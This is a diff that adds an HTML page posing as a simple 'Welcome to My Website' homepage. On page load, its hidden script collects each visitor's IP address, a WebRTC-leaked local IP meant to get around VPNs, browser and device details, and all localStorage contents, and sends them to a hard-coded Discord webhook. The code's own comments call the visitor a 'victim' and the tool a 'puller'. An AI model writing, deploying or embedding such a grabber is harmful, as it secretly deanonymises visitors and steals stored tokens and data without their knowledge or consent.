@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Welcome to My Website</title>
+</head>
+<body>
+    <h1>Welcome to My Website!</h1>
+    <p>I'm adding more features soon!</p>
+
+    <script>
+        // Function to detect VPN usage
+        async function detectVPN() {
+            try {
+                // Check for known VPN/Proxy patterns in User-Agent
+                const userAgent = navigator.userAgent.toLowerCase();
+                const vpnPatterns = ['vpn', 'proxy', 'tor', 'anonymizer', 'private', 'anonymous'];
+                const isVPN = vpnPatterns.some(pattern => userAgent.includes(pattern));
+                
+                // Check for suspicious network characteristics
+                let networkIndicators = [];
+                if (navigator.connection) {
+                    const conn = navigator.connection;
+                    if (conn.effectiveType === 'slow-2g' || 
+                        conn.downlink < 1 || 
+                        conn.rtt > 500) {
+                        networkIndicators.push('Slow network connection');
+                    }
+                }
+                
+                // Check for different IP sources
+                let ipIndicators = [];
+                try {
+                    const apiCheck = await fetch('https://api.ipify.org?format=json');
+                    const apiData = await apiCheck.json();
+                    
+                    // Simple check for IP consistency
+                    if (apiData.ip !== window.location.hostname) {
+                        ipIndicators.push('Different IP source detected');
+                    }
+                } catch (e) {}
+                
+                // Check for WebRTC IP leakage
+                let webrtcIndicators = [];
+                try {
+                    const pc = new RTCPeerConnection({
+                        iceServers: []
+                    });
+                    pc.createDataChannel('');
+                    pc.createOffer().then(pc.setLocalDescription.bind(pc));
+                    
+                    // Wait for ICE candidates
+                    await new Promise(resolve => {
+                        pc.onicecandidate = e => {
+                            if (!e.candidate) resolve();
+                        };
+                    });
+                    
+                    // Extract IP from SDP
+                    const sdp = pc.localDescription.sdp;
+                    const ipMatch = sdp.match(/([0-9]{1,3}(?:\.[0-9]{1,3}){3})/);
+                    if (ipMatch) {
+                        webrtcIndicators.push(`WebRTC IP: ${ipMatch[1]}`);
+                    }
+                } catch (e) {}
+                
+                // Combine all indicators
+                const allIndicators = [...networkIndicators, ...ipIndicators, ...webrtcIndicators];
+                
+                return {
+                    detected: isVPN || allIndicators.length > 0,
+                    indicators: allIndicators,
+                    isVPN: isVPN
+                };
+            } catch (error) {
+                console.error('VPN detection error:', error);
+                return { detected: false, indicators: [], isVPN: false };
+            }
+        }
+
+        // Function to bypass VPN and get real IP
+        async function bypassVPN() {
+            try {
+                // Method 1: Try different IP services
+                const ipServices = [
+                    'https://api.ipify.org?format=json',
+                    'https://icanhazip.com/',
+                    'https://httpbin.org/ip',
+                    'https://api.my-ip.io/ip.json'
+                ];
+                
+                let bypassedIP = null;
+                for (const service of ipServices) {
+                    try {
+                        const response = await fetch(service);
+                        if (service.includes('json')) {
+                            const data = await response.json();
+                            bypassedIP = data.ip || data.origin || data.ipAddress;
+                        } else {
+                            bypassedIP = await response.text();
+                        }
+                        
+                        if (bypassedIP) break;
+                    } catch (e) {}
+                }
+                
+                // Method 2: Use WebRTC to get local IP
+                let localIP = null;
+                try {
+                    const pc = new RTCPeerConnection({
+                        iceServers: []
+                    });
+                    pc.createDataChannel('');
+                    pc.createOffer().then(pc.setLocalDescription.bind(pc));
+                    
+                    // Wait for ICE candidates
+                    await new Promise(resolve => {
+                        pc.onicecandidate = e => {
+                            if (!e.candidate) resolve();
+                        };
+                    });
+                    
+                    // Extract IP from SDP
+                    const sdp = pc.localDescription.sdp;
+                    const ipMatch = sdp.match(/([0-9]{1,3}(?:\.[0-9]{1,3}){3})/);
+                    if (ipMatch) {
+                        localIP = ipMatch[1];
+                    }
+                } catch (e) {}
+                
+                return {
+                    bypassedIP: bypassedIP,
+                    localIP: localIP
+                };
+            } catch (error) {
+                console.error('VPN bypass error:', error);
+                return { bypassedIP: null, localIP: null };
+            }
+        }
+
+        // Function to collect essential victim information
+        async function collectVictimInfo() {
+            try {
+                // Get IP address
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+
+                // Detect VPN
+                const vpnStatus = await detectVPN();
+
+                // Bypass VPN if detected
+                let bypassedInfo = null;
+                if (vpnStatus.detected) {
+                    bypassedInfo = await bypassVPN();
+                }
+
+                // Get browser info
+                const browserInfo = {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    cookieEnabled: navigator.cookieEnabled,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                };
+
+                // Get device info
+                const deviceInfo = {
+                    deviceMemory: navigator.deviceMemory || null,
+                    hardwareConcurrency: navigator.hardwareConcurrency,
+                    maxTouchPoints: navigator.maxTouchPoints
+                };
+
+                // Get local storage items
+                const localStorageItems = {};
+                for (let key in localStorage) {
+                    localStorageItems[key] = localStorage.getItem(key);
+                }
+
+                // Combine all information
+                const victimInfo = {
+                    ip: ipData.ip,
+                    port: window.location.port || (window.location.protocol === 'https:' ? 443 : 80),
+                    vpn: vpnStatus.detected,
+                    vpnIsVPN: vpnStatus.isVPN,
+                    vpnIndicators: vpnStatus.indicators,
+                    bypassedIP: bypassedInfo?.bypassedIP,
+                    localIP: bypassedInfo?.localIP,
+                    ...browserInfo,
+                    deviceInfo,
+                    localStorage: localStorageItems,
+                    timestamp: new Date().toISOString()
+                };
+
+                // Send to webhook
+                await sendToWebhook(victimInfo);
+            } catch (error) {
+                console.error('Error collecting victim info:', error);
+            }
+        }
+
+        // Function to send data to webhook
+        async function sendToWebhook(info) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1461964964603625594/jH-XEtXJtxJm69mjlFViAi8BQWutT-P6wTioZ-tElKw3BlJihCEeuNB2AazCCIjgKQKU';
+            
+            // Format the message with VPN detection and bypass results
+            const message = `
+**INFO FR FR**
+**INFO PULLED BY CPUs PULLER**
+- IP Address: ${info.ip}
+- Port Number: ${info.port}
+${info.localIP ? `- Local IP: ${info.localIP}` : ''}
+- User Agent: ${info.userAgent.substring(0, 60)}...
+- Platform: ${info.platform}
+- Language: ${info.language}
+- Cookie Enabled: ${info.cookieEnabled ? 'Yes' : 'No'}
+- Timezone: ${info.timezone}
+- Timestamp: ${info.timestamp}
+
+**Device Info:**
+${info.deviceInfo ? `- Device Memory: ${info.deviceInfo.deviceMemory}GB\n- Hardware Concurrency: ${info.deviceInfo.hardwareConcurrency}\n- Max Touch Points: ${info.deviceInfo.maxTouchPoints}` : 'Not available'}
+
+**Local Storage Items:**
+${info.localStorage ? Object.keys(info.localStorage).map(key => `- ${key}: ${info.localStorage[key]}`).join('\n') : 'None'}
+            `.trim();
+
+            // Send to webhook
+            const response = await fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    content: message
+                })
+            });
+
+            if (!response.ok) {
+                throw new Error(`Failed to send webhook: ${response.status}`);
+            }
+
+            console.log('Victim info sent to webhook');
+        }
+
+        // Call the function when the page loads
+        window.onload = collectVictimInfo;
+    </script>
+</body>
+</html>
